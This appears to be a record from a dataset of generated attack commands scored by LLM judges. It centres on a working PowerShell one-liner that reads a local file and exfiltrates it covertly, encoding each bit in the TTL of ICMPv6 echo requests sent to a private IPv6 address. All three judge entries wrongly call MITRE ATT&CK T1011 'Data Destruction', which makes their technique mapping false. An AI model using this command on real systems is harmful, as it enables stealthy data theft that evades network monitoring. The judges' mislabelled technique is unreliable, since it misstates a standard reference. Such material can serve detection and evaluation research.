command: $d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\Users\Public\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }
explanation: Encodes bits of each byte into the Time To Live (TTL) of ICMPv6 echo requests, using ICMP as an alternate network medium per T1011.
rationale_steps: Convert each byte to an 8-bit binary string.
Map bit values to distinct TTLs to represent 0/1.
Transmit ICMPv6 echos with selected TTLs to a ULA destination.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct method calls, and appropriate pipeline operations.
llm_judgments.semantic_justification: While the command does implement a covert channel using ICMP TTL values for data exfiltration, it doesn't align with T1011 (Data Destruction) but rather with T1048 (Exfiltration Over Alternative Protocol) or T1020 (Automated Exfiltration).

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed, uses correct syntax for variable assignment, file I/O, loops, conditional logic, and the Test-Connection cmdlet with valid parameters.
llm_judgments.semantic_justification: The command reads data from a file and transmits it via ICMP TTL encoding, which is a form of data exfiltration or command and control, and is completely unrelated to MITRE ATT&CK technique T1011 (Data Destruction).

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quotes/braces, valid Test-Connection parameters, and proper command separators.
llm_judgments.semantic_justification: The command implements covert ICMPv6 exfiltration via TTL/hop-limit encoding rather than any data destruction, so it is not aligned with the provided technique description.
